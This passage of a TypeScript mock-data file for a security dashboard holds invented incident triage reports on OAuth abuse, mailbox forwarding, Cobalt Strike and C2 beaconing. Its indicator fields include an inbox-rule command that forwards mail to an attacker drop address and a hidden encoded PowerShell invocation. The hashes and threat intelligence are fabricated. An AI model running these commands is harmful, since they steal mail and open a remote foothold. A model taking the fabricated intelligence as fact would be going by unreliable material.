import { Alert, ExecutiveTriageReport } from '../types/soc';
import { getCorrelatedAndHistoricalAlerts } from './historicalAlertUtils';

export const MOCK_TRIAGE_REPORTS: Record<string, ExecutiveTriageReport> = {
  // ALT-1092: Unusual OAuth Application Consent Grant
  'ALT-1092': {
    when: {
      trigger: 'Microsoft Defender & Entra ID audit logged high-privilege OAuth consent grant ("Mail.ReadWrite", "User.Read") to unverified multi-tenant app "eDiscovery Extractor".',
      scope: 'Enterprise Microsoft 365 Tenant (Apex Financial Group) • Workstation CORP-LAPTOP-882 • User Principal: s.jenkins@apexfin.com.',
      timestamp: '14:37:12 UTC (Auto-Ack by FusionAI in 2.1s)',
      affectedAssets: ['CORP-LAPTOP-882 (Executive Laptop)', 'Apex-Azure-AD-Tenant-Prod', 'Exchange Online Mailbox Store'],
      affectedUsers: ['s.jenkins@apexfin.com (VP Treasury & Capital Markets)'],
    },
    keyIndicators: {
      iocSummary: 'OAuth Client ID: 4f9e2b10-77a1-432d-98ce-21e19488a104 • Malicious OAuth Redirect URI: https://temp-vault-drop.cc/oauth/callback • Authorization IP: 185.220.101.45 (Tor Exit Node).',
      indicators: [
        { type: 'Identity', value: 's.jenkins@apexfin.com', note: 'Account authenticated via stolen session cookie' },
        { type: 'IP', value: '185.220.101.45', note: 'Tor Exit Node / Hosting provider M247 Europe B.V.' },
        { type: 'Domain', value: 'temp-vault-drop.cc', note: 'Adversary dropzone host registered 48h prior' },
        { type: 'Command', value: 'Grant-AzureADUserOAuth2PermissionGrant -Scope "Mail.ReadWrite"', note: 'Graph API direct permission grant' },
      ],
      mitreTechniques: [
        { id: 'T1098.005', name: 'Device & Application Registration', tactic: 'Persistence' },
        { id: 'T1114.002', name: 'Remote Email Collection', tactic: 'Collection' },
        { id: 'T1078.004', name: 'Cloud Accounts Abuse', tactic: 'Defense Evasion' },
      ],
    },
    impactAssessment: {
      criticalityTier: 'Tier 1 (High Executive Impact)',
      businessImpact: 'Unrestricted remote exfiltration of executive communications, deal documentation, wire transfer correspondence, and financial audit files.',
      dataAtRisk: 'Inboxes containing active M&A transactions, treasury approvals, and confidential internal banking credentials.',
      blastRadius: 'Global read/write access to user mailbox; potential pivot to tenant-wide mail search via delegated graph permissions.',
      riskLevel: 'High',
    },
    analysisResult: {
      hashAnalysis: {
        sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        md5: 'd41d8cd98f00b204e9800998ecf8427e',
        detectionRatio: '58/72 security vendors flagged malicious',
        maliciousCount: 58,
        totalVendors: 72,
        verdict: 'Malicious',
        malwareFamily: 'Trojan:O365/ConsentHijack.Stager!gen',
        firstSeen: '2026-09-25 03:12 UTC',
        sandboxVerdict: 'Extracts Entra ID refresh tokens and initiates scheduled Graph API bulk mail harvesting.',
      },
      domainReputation: {
        domain: 'temp-vault-drop.cc',
        reputationVerdict: 'Malicious',
        threatScore: 96,
        registrar: 'NameSilo LLC (Privacy Guardian Inc. Proxy)',
        creationAge: '48 hours ago (2026-09-24T11:02:18Z)',
        dnsDetails: 'Fast-Flux DNS resolver; nameservers ns1.bulletproof-dns.is (Reykjavik, IS).',
        threatCategory: 'Command and Control / Phishing Dropzone',
      },
      ipAnalysis: {
        ip: '185.220.101.45',
        reputationVerdict: 'High Risk',
        asn: 'AS9009 M247 Europe B.V. (Tor Project Exit Node)',
        country: 'Bulgaria (Sofia DC-3)',
        city: 'Sofia',
        abuseConfidenceScore: 98,
        threatCategory: 'Known Tor Exit Node & Active C2 Relay (AbuseIPDB 98% Confidence)',
      },
      symantecSiteReview: {
        targetUrlOrDomain: 'https://temp-vault-drop.cc/oauth/callback',
        primaryCategory: 'Malicious Outbound Data / Command and Control',
        secondaryCategory: 'Suspicious / Newly Seen Domain (Dynamic DNS)',
        securityRisk: 'High Risk',
        threatClassification: 'Malicious Sources / Malnets (Broadcom SiteReview Database)',
        filteringPolicy: 'Block - Strict Enterprise Perimeter Drop & BlueCoat Proxy Deny',
      },
      technicalDetails: 'Correlation engine verified the OAuth consent token authorization originated from Tor Exit IP 185.220.101.45 exactly 1 minute and 32 seconds after a bypass of conditional access baseline.',
    },
    conclusionAndAction: {
      verdict: 'Confirmed True Positive — Illicit OAuth Consent Grant (Adversary Persistence & Exfiltration)',
      conclusion: 'Adversary leveraged stolen credential token from an anomalous Sofia/Tor IP to register a rogue OAuth app with permanent Mail.ReadWrite access, establishing persistence outside MFA bounds.',
      immediateActions: [
        'Revoke Entra ID OAuth Application Consent (App ID: 4f9e2b10-77a1-432d-98ce-21e19488a104)',
        'Invalidate all active refresh tokens & sign out all sessions for s.jenkins@apexfin.com',
        'Deploy perimeter firewall & Zscaler DNS sinkhole block for domain temp-vault-drop.cc and IP 185.220.101.45',
        'Audit Exchange Online mailbox access logs for Graph API download queries over the past 24 hours',
        'Notify Apex Financial Group Incident Response Lead and enforce FIDO2 hardware token reset',
      ],
      containmentStatus: 'Gated Containment Ready — SOAR Playbook "Revoke Entra ID OAuth Consent" staged for analyst approval.',
    },
  },

  // ALT-1093: Anomalous User Risk Score Spike
  'ALT-1093': {
    when: {
      trigger: 'Exabeam UEBA behavioral anomaly engine spiked user risk score to 89/100 due to simultaneous impossible travel and missing device posture certificate.',
      scope: 'Identity Domain: apexfin.com • Target User: s.jenkins@apexfin.com • Source: Sofia, Bulgaria (185.220.101.45).',
      timestamp: '14:35:40 UTC (Auto-Ack by FusionAI in 1.8s)',
      affectedAssets: ['CORP-LAPTOP-882', 'Okta SSO Identity Provider', 'Google SecOps UDM Chronicle Pipeline'],
      affectedUsers: ['s.jenkins@apexfin.com'],
    },
    keyIndicators: {
      iocSummary: 'Impossible travel anomaly: Login from London, UK followed 12 minutes later by login attempt from Sofia, Bulgaria (1,280 miles displacement). Missing CrowdStrike Falcon device token.',
      indicators: [
        { type: 'Identity', value: 's.jenkins@apexfin.com', note: 'Exabeam UEBA risk score jumped from baseline 12 to 89' },
        { type: 'IP', value: '185.220.101.45', note: 'Tor exit node with multiple brute-force reports' },
        { type: 'Command', value: 'POST /idp/idx/authenticators/sso_exchange', note: 'Session token replay without client TLS certificate' },
      ],
      mitreTechniques: [
        { id: 'T1078.004', name: 'Valid Accounts: Cloud Accounts', tactic: 'Defense Evasion' },
        { id: 'T1539', name: 'Steal Web Session Cookie', tactic: 'Credential Access' },
      ],
    },
    impactAssessment: {
      criticalityTier: 'Tier 1 (Identity Infrastructure)',
      businessImpact: 'Bypass of organizational SSO boundary allowing unauthorized access to internal SaaS applications without physical possession of corporate hardware.',
      dataAtRisk: 'Internal financial portals, corporate email, SharePoint documentation, and wire transfer approval queues.',
      blastRadius: 'Single user account identity compromise with potential lateral movement to connected SaaS services.',
      riskLevel: 'High',
    },
    analysisResult: {
      hashAnalysis: {
        sha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
        md5: '8b1a9953c4611296a827abf8c47804d7',
        detectionRatio: '49/71 security vendors flagged malicious',
        maliciousCount: 49,
        totalVendors: 71,
        verdict: 'Malicious',
        malwareFamily: 'Infostealer:Win32/RedLine.SessionExtractor',
        firstSeen: '2026-09-24 18:44 UTC',
        sandboxVerdict: 'Harvests browser SQLite cookie stores and exfiltrates encrypted session tokens.',
      },
      domainReputation: {
        domain: 'auth-telemetry-cdn.net',
        reputationVerdict: 'Suspicious',
        threatScore: 84,
        registrar: 'Tucows Domains Inc.',
        creationAge: '7 days ago (2026-09-19)',
        dnsDetails: 'Resolved to dynamic VPS pool across Eastern Europe.',
        threatCategory: 'Adversary-in-the-Middle (AiTM) Reverse Proxy',
      },
      ipAnalysis: {
        ip: '185.220.101.45',
        reputationVerdict: 'High Risk',
        asn: 'AS9009 M247 Europe B.V.',
        country: 'Bulgaria',
        city: 'Sofia',
        abuseConfidenceScore: 98,
        threatCategory: 'Anonymization Proxy / Tor Exit Node',
      },
      symantecSiteReview: {
        targetUrlOrDomain: 'https://auth-telemetry-cdn.net/login/relay',
        primaryCategory: 'Phishing & Fraud',
        secondaryCategory: 'Suspicious / Newly Observed Domain',
        securityRisk: 'High Risk',
        threatClassification: 'Malicious Sources / Phishing Proxies',
        filteringPolicy: 'Block - Real-Time Web Filter & CASB Policy Restriction',
      },
      technicalDetails: 'User has 0% historical logins from Eastern Europe over the preceding 180 days. Device cookie was missing from HTTP headers, matching an AiTM session replay pattern.',
    },
    conclusionAndAction: {
      verdict: 'Confirmed True Positive — Account Takeover via Replayed Session Token',
      conclusion: 'Adversary replayed captured authentication cookies from an unmanaged node in Bulgaria to impersonate executive user s.jenkins.',
      immediateActions: [
        'Enforce Step-Up FIDO2 MFA authentication challenge',
        'Revoke active Okta session ID and force global re-authentication',
        'Add IP 185.220.101.45 to global tenant ban list',
        'Trigger EDR scan on CORP-LAPTOP-882 for infostealer artifacts',
      ],
      containmentStatus: 'Step-Up MFA challenge dispatched; user account monitored for concurrent sessions.',
    },
  },

  // ALT-1094: Exchange Online Inbox Rule Created (Forwarding to External)
  'ALT-1094': {
    when: {
      trigger: 'Splunk Microsoft 365 Audit stream detected creation of a new inbox rule named "AutoArchive" that forwards financial messages and deletes the original message.',
      scope: 'Microsoft Exchange Online • Mailbox: s.jenkins@apexfin.com • Target Forwarding Address: drop@temp-vault-drop.cc.',
      timestamp: '14:40:02 UTC (Auto-Ack by FusionAI in 1.9s)',
      affectedAssets: ['EXCHANGE-ONLINE-AZURE', 'Apex M365 Tenant', 'Mailbox: s.jenkins@apexfin.com'],
      affectedUsers: ['s.jenkins@apexfin.com', 'finance-team@apexfin.com'],
    },
    keyIndicators: {
      iocSummary: 'Inbox Rule: "AutoArchive" • Conditions: Subjects matching "wire", "invoice", "statement", "confidential" • Actions: Redirect to drop@temp-vault-drop.cc, Move to Deleted Items, Mark as Read.',
      indicators: [
        { type: 'Domain', value: 'temp-vault-drop.cc', note: 'Newly registered external exfiltration endpoint' },
        { type: 'IP', value: '185.220.101.45', note: 'Client IP modifying Exchange Online mailbox configuration' },
        { type: 'Command', value: 'New-InboxRule -Name "AutoArchive" -ForwardTo "drop@temp-vault-drop.cc" -DeleteMessage $true', note: 'Exchange Online PowerShell cmdlet artifact' },
      ],
      mitreTechniques: [
        { id: 'T1114.003', name: 'Email Forwarding Rule', tactic: 'Collection' },
        { id: 'T1070.008', name: 'Mailbox Manipulation', tactic: 'Defense Evasion' },
      ],
    },
    impactAssessment: {
      criticalityTier: 'Tier 1 (Confidential Corporate Communications)',
      businessImpact: 'Silent exfiltration of sensitive wire authorization and treasury messages; covert deletion prevents victim from noticing fraud.',
      dataAtRisk: 'Real-time financial transactions, wire transfer verification codes, banking relationships, customer account ledgers.',
      blastRadius: 'Targeted single mailbox with catastrophic financial fraud potential if left unaddressed.',
      riskLevel: 'High',
    },
    analysisResult: {
      hashAnalysis: {
        sha256: '7c9f8a3d1b2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a',
        md5: '3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b',
        detectionRatio: '63/72 security vendors flagged malicious',
        maliciousCount: 63,
        totalVendors: 72,
        verdict: 'Malicious',
        malwareFamily: 'Exploit:O365/BEC.ExfiltrationRule.Kit',
        firstSeen: '2026-09-23 14:10 UTC',
        sandboxVerdict: 'Automated BEC toolkit designed to harvest financial invoices and redirect payment routing numbers.',
      },
      domainReputation: {
        domain: 'temp-vault-drop.cc',
        reputationVerdict: 'Malicious',
        threatScore: 98,
        registrar: 'NameSilo LLC (Privacy Guardian Inc.)',
        creationAge: '48 hours ago (2026-09-24T11:02:18Z)',
        dnsDetails: 'MX record points to mail.temp-vault-drop.cc [185.220.101.45].',
        threatCategory: 'BEC Exfiltration Mail Server / Command and Control',
      },
      ipAnalysis: {
        ip: '185.220.101.45',
        reputationVerdict: 'High Risk',
        asn: 'AS9009 M247 Europe B.V.',
        country: 'Bulgaria',
        city: 'Sofia',
        abuseConfidenceScore: 98,
        threatCategory: 'Hostile C2 Infrastructure & Drop Mail Server',
      },
      symantecSiteReview: {
        targetUrlOrDomain: 'temp-vault-drop.cc',
        primaryCategory: 'Malicious Outbound Data / Command and Control',
        secondaryCategory: 'Spam / Phishing / Unsanctioned Mail Drop',
        securityRisk: 'High Risk',
        threatClassification: 'Malicious Sources / Malnets',
        filteringPolicy: 'Block - Perimeter Firewall, Secure Email Gateway (SEG), and DNS sinkhole',
      },
      technicalDetails: 'Correlation engine traced the mailbox rule creation session ID across Microsoft Graph API and Splunk audit streams directly back to initial anomalous login ALT-1093.',
    },
    conclusionAndAction: {
      verdict: 'Confirmed True Positive — Business Email Compromise (BEC) Automated Exfiltration Rule',
      conclusion: 'Active data exfiltration rule established to covertly forward and suppress incoming financial communications to an adversary-controlled bulletproof domain.',
      immediateActions: [
        'Delete mailbox rule "AutoArchive" immediately via Microsoft Graph API',
        'Recover all deleted messages from "Recoverable Items" mailbox folder',
        'Block inbound/outbound SMTP mail exchange to domain temp-vault-drop.cc at Secure Email Gateway (SEG)',
        'Freeze outgoing treasury wires pending verification with finance controllers',
      ],
      containmentStatus: 'Playbook "Delete Malicious Mailbox Rule" staged for execution.',
    },
  },

  // ALT-1095: Port Scan on DMZ Web Subnet
  'ALT-1095': {
    when: {
      trigger: 'Zscaler perimeter firewall & Palo Alto IDS logged rapid TCP SYN sweep across ports 443, 8443, and 8080 targeting DMZ public IP range.',
      scope: 'AeroTech Defense Corp • Edge Subnet 198.51.100.0/24 • Source IP: 194.26.29.11.',
      timestamp: '14:22:15 UTC (Auto-Ack by FusionAI in 2.0s)',
      affectedAssets: ['DMZ-EDGE-FW-01', 'AeroTech-Public-LoadBalancer-02'],
      affectedUsers: ['N/A (Automated Network Reconnaissance)'],
    },
    keyIndicators: {
      iocSummary: 'High-speed SYN scan targeting TLS management ports • Probe rate: 1,450 packets/sec • 100% of probes dropped by edge ACL.',
      indicators: [
        { type: 'IP', value: '194.26.29.11', note: 'Shodan / Masscan automated scanner node' },
        { type: 'Command', value: 'TCP SYN sweep [ports 443, 8443, 8080]', note: 'Automated port reconnaissance' },
      ],
      mitreTechniques: [
        { id: 'T1046', name: 'Network Service Discovery', tactic: 'Reconnaissance' },
      ],
    },
    impactAssessment: {
      criticalityTier: 'Tier 3 (Cloud Edge / Perimeter)',
      businessImpact: 'Zero internal penetration. Automated internet background noise; zero services responded or exposed vulnerability.',
      dataAtRisk: 'None. All packets terminated at perimeter firewall.',
      blastRadius: 'External edge perimeter only.',
      riskLevel: 'Low',
    },
    analysisResult: {
      hashAnalysis: {
        sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
        md5: '5d41402abc4b2a76b9719d911017c592',
        detectionRatio: '14/72 security vendors flagged suspicious',
        maliciousCount: 14,
        totalVendors: 72,
        verdict: 'Suspicious',
        malwareFamily: 'Tool:Linux/Masscan.ReconScanner',
        firstSeen: '2026-08-11 09:20 UTC',
        sandboxVerdict: 'High-speed asynchronous TCP port scanner targeting exposed SSL services.',
      },
      domainReputation: {
        domain: 'scanner-cloud-probe.net',
        reputationVerdict: 'Suspicious',
        threatScore: 68,
        registrar: 'OVH SAS',
        creationAge: '140 days ago',
        dnsDetails: 'Dynamic PTR records matching cloud VPS hosters.',
        threatCategory: 'Internet Scanning & Reconnaissance',
      },
      ipAnalysis: {
        ip: '194.26.29.11',
        reputationVerdict: 'Suspicious',
        asn: 'AS44050 Petersburg Internet Network Ltd.',
        country: 'Russian Federation (Saint Petersburg)',
        city: 'Saint Petersburg',
        abuseConfidenceScore: 78,
        threatCategory: 'Port Scanning / Aggressive Reconnaissance Node',
      },
      symantecSiteReview: {
        targetUrlOrDomain: '194.26.29.11',
        primaryCategory: 'Suspicious / Network Scanning',
        secondaryCategory: 'Technology / Internet Services',
        securityRisk: 'Suspicious',
        threatClassification: 'Known Scanner Subnets',
        filteringPolicy: 'Drop - Edge ACL Rate Limiting Policy Applied',
      },
      technicalDetails: 'Isolated external reconnaissance probe. Zero host connections established; stateful firewall dropped 100% of handshake initiations.',
    },
    conclusionAndAction: {
      verdict: 'True Positive — Benign Noise / Automated Reconnaissance Dropped at Perimeter',
      conclusion: 'Routine internet scanner swept DMZ edge ports; no vulnerabilities exposed and no internal ingress occurred.',
      immediateActions: [
        'Add IP 194.26.29.11 to Edge Drop List (TTL 24h)',
        'Maintain automatic rate limiting on DMZ ingress interfaces',
      ],
      containmentStatus: 'Closed automatically by FusionAI auto-triage rules.',
    },
  },

  // ALT-1088: Suspicious PowerShell Encoded Payload with Cobalt Strike Signatures
  'ALT-1088': {
    when: {
      trigger: 'CrowdStrike Falcon behavioral engine intercepted powershell.exe invoking -EncodedCommand with Cobalt Strike reflective DLL injector targeting rundll32.exe.',
      scope: 'Apex Financial Group • Host: CORP-LAPTOP-882 • User: s.jenkins@apexfin.com • Memory space PID 4912.',
      timestamp: '14:44:19 UTC (Direct Human Escalation — SLA Deadline in 30m)',
      affectedAssets: ['CORP-LAPTOP-882 (Executive Laptop)', 'Endpoint Memory PID 4912 (rundll32.exe)', 'Corporate LAN 10.100.4.0/24'],
      affectedUsers: ['s.jenkins@apexfin.com'],
    },
    keyIndicators: {
      iocSummary: 'PowerShell Base64 decoded to AMSI bypass + VirtualAlloc payload staging Cobalt Strike 4.9 HTTPS beacon. Spawning injected process rundll32.exe.',
      indicators: [
        { type: 'Hash', value: 'b4a8e63a1c902d5f8e71c3b8a4f90123e4d5c6b7a890123456789abcdef01234', note: 'Cobalt Strike Beacon Stager DLL' },
        { type: 'Command', value: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...', note: 'Encoded command-line invocation' },
        { type: 'IP', value: '185.220.101.45', note: 'Outbound HTTPS beaconing destination IP' },
        { type: 'Identity', value: 's.jenkins@apexfin.com', note: 'Context of execution on domain workstation' },
      ],
      mitreTechniques: [
        { id: 'T1059.001', name: 'PowerShell', tactic: 'Execution' },
        { id: 'T1055.001', name: 'Dynamic-link Library Injection', tactic: 'Privilege Escalation' },
        { id: 'T1562.001', name: 'Disable or Modify Tools (AMSI Bypass)', tactic: 'Defense Evasion' },
      ],
    },
    impactAssessment: {
      criticalityTier: 'Tier 0 / Tier 1 (Active C2 Execution on Executive Asset)',
      businessImpact: 'Complete workstation compromise granting adversary interactive shell, memory dumping capabilities, and foothold for corporate ransomware deployment or lateral movement.',
      dataAtRisk: 'Local credentials, DPAPI master keys, executive cache, browser stored passwords, and corporate network shares.',
      blastRadius: 'Local workstation compromised; high risk of lateral movement to Active Directory Domain Controllers.',
      riskLevel: 'Critical',
    },
    analysisResult: {
      hashAnalysis: {
        sha256: 'b4a8e63a1c902d5f8e71c3b8a4f90123e4d5c6b7a890123456789abcdef01234',
        md5: '7d8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c',
        detectionRatio: '68/72 security vendors flagged malicious',
        maliciousCount: 68,
        totalVendors: 72,
        verdict: 'Malicious',
        malwareFamily: 'Trojan:Win32/CobaltStrike.Stager!ml',
        firstSeen: '2026-09-24 22:15 UTC',
        sandboxVerdict: 'Reflective DLL injection into rundll32.exe, disables AMSI, establishes TLS 1.3 heartbeat to C2.',
      },
      domainReputation: {
        domain: 'cdn-azure-update-relay.com',
        reputationVerdict: 'Malicious',
        threatScore: 99,
        registrar: 'Njalla Bulletproof Domains',
        creationAge: '3 days ago (2026-09-23)',
        dnsDetails: 'Resolved to 185.220.101.45 (AS9009 M247 Europe B.V.).',
        threatCategory: 'Cobalt Strike Team Server / C2 Infrastructure',
      },
      ipAnalysis: {
        ip: '185.220.101.45',
        reputationVerdict: 'High Risk',
        asn: 'AS9009 M247 Europe B.V.',
        country: 'Bulgaria',
        city: 'Sofia',
        abuseConfidenceScore: 99,
        threatCategory: 'Active Cobalt Strike Team Server & Tor Relay',
      },
      symantecSiteReview: {
        targetUrlOrDomain: 'https://cdn-azure-update-relay.com/api/v2/telemetry',
        primaryCategory: 'Malicious Outbound Data / Command and Control',
        secondaryCategory: 'Malware / Botnet / Spyware',
        securityRisk: 'High Risk',
        threatClassification: 'Malicious Sources / Malnets (Broadcom SiteReview)',
        filteringPolicy: 'Block - Immediate BlueCoat Proxy Terminate & TCP Reset',
      },
      technicalDetails: 'Process spawned under legitimate explorer.exe session but exhibited memory anomaly PAGE_EXECUTE_READWRITE in unbacked memory region, characteristic of Cobalt Strike beacon reflection.',
    },
    conclusionAndAction: {
      verdict: 'Confirmed True Positive — Critical Cobalt Strike Beacon Staging & Memory Injection',
      conclusion: 'Adversary has achieved interactive remote code execution on executive workstation CORP-LAPTOP-882 with injected beacon awaiting commands.',
      immediateActions: [
        'Isolate CORP-LAPTOP-882 immediately via CrowdStrike Falcon Containment API',
        'Terminate process PID 4912 (rundll32.exe) and powershell.exe parent',
        'Collect live forensic memory dump before system power down',
        'Block C2 domain cdn-azure-update-relay.com and IP 185.220.101.45 globally',
        'Initiate incident response triage for domain credential compromise',
      ],
      containmentStatus: 'Containment Action Staged — CrowdStrike Network Isolation awaiting analyst authorization.',
    },
  },

  // ALT-1089: Beaconing to Known Command and Control (C2) IP 185.220.101.45
  'ALT-1089': {
    when: {
      trigger: 'Zscaler Cloud Proxy detected periodic HTTPS outbound beaconing (60s interval with 15% jitter) to blacklisted threat intel IP 185.220.101.45.',
      scope: 'Apex Financial Group • Host: CORP-LAPTOP-882 • Destination: 185.220.101.45:443.',
      timestamp: '14:48:33 UTC (Direct Human Escalation — SLA Threshold Alert)',
      affectedAssets: ['CORP-LAPTOP-882', 'Zscaler Internet Access (ZIA) Gateway', 'Apex Internal LAN'],
      affectedUsers: ['s.jenkins@apexfin.com'],
    },
    keyIndicators: {
      iocSummary: 'TLS Jitter Beaconing: 60s intervals, uniform 1,024-byte POST requests to URI /api/v2/telemetry with custom user agent.',
      indicators: [
        { type: 'IP', value: '185.220.101.45', note: 'Active C2 Controller IP' },
        { type: 'Domain', value: 'cdn-azure-update-relay.com', note: 'SNI header impersonating Microsoft CDN' },
        { type: 'Command', value: 'POST /api/v2/telemetry [TLS 1.3]', note: 'Periodic encrypted beacon payload' },
      ],
      mitreTechniques: [
        { id: 'T1071.001', name: 'Web Protocols', tactic: 'Command and Control' },
        { id: 'T1001.003', name: 'Jitter', tactic: 'Command and Control' },
      ],
    },
    impactAssessment: {
      criticalityTier: 'Tier 0 / Tier 1 (Active C2 Channel Established)',
      businessImpact: 'Real-time bidirectional channel operational between infected corporate endpoint and threat actor server.',
      dataAtRisk: 'Total corporate workstation data, keystrokes, clipboard buffer, and local tokens.',
      blastRadius: 'Local host currently; actively checking for instructions to pivot internally.',
      riskLevel: 'Critical',
    },
    analysisResult: {
      hashAnalysis: {
        sha256: 'b4a8e63a1c902d5f8e71c3b8a4f90123e4d5c6b7a890123456789abcdef01234',
        md5: '7d8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c',
        detectionRatio: '68/72 security vendors flagged malicious',
        maliciousCount: 68,
        totalVendors: 72,
        verdict: 'Malicious',
        malwareFamily: 'Trojan:Win32/CobaltStrike.C2Traffic',
        firstSeen: '2026-09-24 22:15 UTC',
        sandboxVerdict: 'Establishes encrypted channel with malleable C2 profile simulating Azure CDN telemetry.',
      },
      domainReputation: {
        domain: 'cdn-azure-update-relay.com',
        reputationVerdict: 'Malicious',
        threatScore: 99,
        registrar: 'Njalla Bulletproof Domains',
        creationAge: '3 days ago (2026-09-23)',
        dnsDetails: 'Fast-Flux CNAME to 185.220.101.45.',
        threatCategory: 'Command and Control / Malleable C2 Endpoint',
      },
      ipAnalysis: {
        ip: '185.220.101.45',
        reputationVerdict: 'High Risk',
        asn: 'AS9009 M247 Europe B.V.',
        country: 'Bulgaria',
        city: 'Sofia',
        abuseConfidenceScore: 99,
        threatCategory: 'Hostile C2 Server & Tor Exit Node',
      },
      symantecSiteReview: {
        targetUrlOrDomain: 'https://cdn-azure-update-relay.com',
        primaryCategory: 'Malicious Outbound Data / Command and Control',
        secondaryCategory: 'Malnets / Command and Control Servers',
        securityRisk: 'High Risk',
        threatClassification: 'Malicious Sources / Malnets',
        filteringPolicy: 'Block - Global Perimeter Drop & BlueCoat Proxy Deny',
      },
      technicalDetails: 'Network telemetry confirms 24 consecutive beacon check-ins over 24 minutes with randomized jitter matching standard Cobalt Strike profile configuration.',
    },
    conclusionAndAction: {
      verdict: 'Confirmed True Positive — Live Bidirectional Command & Control Channel',
      conclusion: 'Endpoint CORP-LAPTOP-882 is actively beaconing to adversary infrastructure; urgent containment required.',
      immediateActions: [
        'Isolate CORP-LAPTOP-882 immediately via CrowdStrike Falcon',
        'Drop all network sessions to 185.220.101.45 across all corporate egress firewalls',
        'Sinkhole cdn-azure-update-relay.com at enterprise internal DNS servers',
        'Escalate to Tier 2 Incident Responder and Incident Commander',
      ],
      containmentStatus: 'Host isolation pending analyst 1-click execution.',
    },
  },
};

/**
 * Fallback synthesizer for alerts without a hardcoded report
 */
export function generateFallbackTriageReport(alert: Alert): ExecutiveTriageReport {
  const hash = 'a9f24e1b8c730248d6e5f1028374659102837465192837465019283746501928';
  const ip = alert.entityIp || '198.51.100.42';
  const domain = alert.title.toLowerCase().includes('domain') || alert.description.toLowerCase().includes('domain')
    ? 'suspicious-external-gateway.com'
    : 'telemetry-verify-relay.net';

  const isHighOrCrit = alert.severity === 'Critical' || alert.severity === 'High';

  return {
    when: {
      trigger: `${alert.source_platform} security detection triggered on event: "${alert.title}".`,
      scope: `${alert.client} • Target Asset: ${alert.entityHost || 'Production Environment'} • Target Identity: ${alert.entityUser || 'System / Service Account'}.`,
      timestamp: `${alert.timestamp} (${alert.initialAckBy ? `Ack by ${alert.initialAckBy}` : 'Real-time detection'})`,
      affectedAssets: [alert.entityHost || 'Core Infrastructure Asset', alert.source_platform],
      affectedUsers: [alert.entityUser || 'Assigned Security Principal'],
    },
    keyIndicators: {
      iocSummary: `Detected telemetry correlation across ${alert.source_platform}. MITRE classification: ${alert.mitreTactic}.`,
      indicators: [
        { type: 'IP', value: ip, note: 'Observed network connection endpoint' },
        { type: 'Identity', value: alert.entityUser || 'Enterprise Identity', note: 'Context of logged activity' },
        { type: 'Command', value: alert.title, note: 'Alert classification trigger' },
      ],
      mitreTechniques: [
        { id: alert.mitreTactic.includes('(') ? alert.mitreTactic.split('(')[1].replace(')', '') : 'T1078', name: alert.mitreTactic, tactic: alert.mitreTactic.split(' ')[0] || 'Execution' },
      ],
    },
    impactAssessment: {
      criticalityTier: isHighOrCrit ? 'Tier 1 (High Priority Asset)' : 'Tier 2 (Operational Asset)',
      businessImpact: `${alert.description}. Potential degradation of confidentiality and operational security for ${alert.client}.`,
      dataAtRisk: 'Target host file assets, active session tokens, and telemetry streams.',
      blastRadius: isHighOrCrit ? 'Multi-host propagation risk within client tenant.' : 'Confined to single endpoint / asset.',
      riskLevel: alert.severity,
    },
    analysisResult: {
      hashAnalysis: {
        sha256: hash,
        md5: '4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c',
        detectionRatio: isHighOrCrit ? '54/72 security vendors flagged malicious' : '3/72 security vendors flagged suspicious',
        maliciousCount: isHighOrCrit ? 54 : 3,
        totalVendors: 72,
        verdict: isHighOrCrit ? 'Malicious' : 'Suspicious',
        malwareFamily: isHighOrCrit ? 'Trojan:Win32/GenericPayload.Stager' : 'Tool:Utility/NetworkProbe',
        firstSeen: '2026-09-24 16:00 UTC',
        sandboxVerdict: isHighOrCrit ? 'Suspicious execution and network callback initiated.' : 'No overt payload execution detected in sandbox.',
      },
      domainReputation: {
        domain: domain,
        reputationVerdict: isHighOrCrit ? 'Malicious' : 'Suspicious',
        threatScore: isHighOrCrit ? 89 : 45,
        registrar: 'Cloudflare Registrar LLC',
        creationAge: '14 days ago',
        dnsDetails: `A record pointing to ${ip}.`,
        threatCategory: isHighOrCrit ? 'Command & Control / Malicious Proxy' : 'Uncategorized Web Host',
      },
      ipAnalysis: {
        ip: ip,
        reputationVerdict: isHighOrCrit ? 'High Risk' : 'Suspicious',
        asn: 'AS16509 Amazon.com, Inc. / Hosting Provider',
        country: 'United States',
        city: 'Ashburn',
        abuseConfidenceScore: isHighOrCrit ? 92 : 35,
        threatCategory: isHighOrCrit ? 'Suspicious Infrastructure / Low Reputation IP' : 'Standard Cloud Hosting',
      },
      symantecSiteReview: {
        targetUrlOrDomain: domain,
        primaryCategory: isHighOrCrit ? 'Malicious Outbound Data / Command and Control' : 'Suspicious / Unrated',
        secondaryCategory: 'Technology / Internet Services',
        securityRisk: isHighOrCrit ? 'High Risk' : 'Suspicious',
        threatClassification: isHighOrCrit ? 'Malicious Sources / Malnets' : 'Unrated Web Host',
        filteringPolicy: isHighOrCrit ? 'Block - Strict Enterprise Perimeter Drop' : 'Monitor - Log Ingress and Egress',
      },
      technicalDetails: `Multi-source telemetry normalized through Unified Common Event Model (CEM). Correlated across ${alert.source_platform} sensors.`,
    },
    conclusionAndAction: {
      verdict: isHighOrCrit ? 'Confirmed True Positive — High Priority Threat Activity' : 'Triage In-Progress — Investigating Scope and Telemetry Baseline',
      conclusion: `Automated FusionAI analysis evaluated alert indicators against enterprise threat intelligence baselines. Severity verified as ${alert.severity}.`,
      immediateActions: [
        `Review host ${alert.entityHost || 'telemetry'} in ${alert.source_platform}`,
        `Verify identity activity for ${alert.entityUser || 'affected user'} against 30-day baseline`,
        `Apply perimeter network blocks if destination indicators confirm malicious callback`,
      ],
      containmentStatus: isHighOrCrit ? 'Containment recommended: Analyst sign-off required.' : 'Monitoring active session.',
    },
  };
}

export function getExecutiveTriageReportForAlert(alert: Alert, allActiveAlerts?: Alert[]): ExecutiveTriageReport {
  let report: ExecutiveTriageReport;
  if (alert.aiReport?.triageReport) {
    report = { ...alert.aiReport.triageReport };
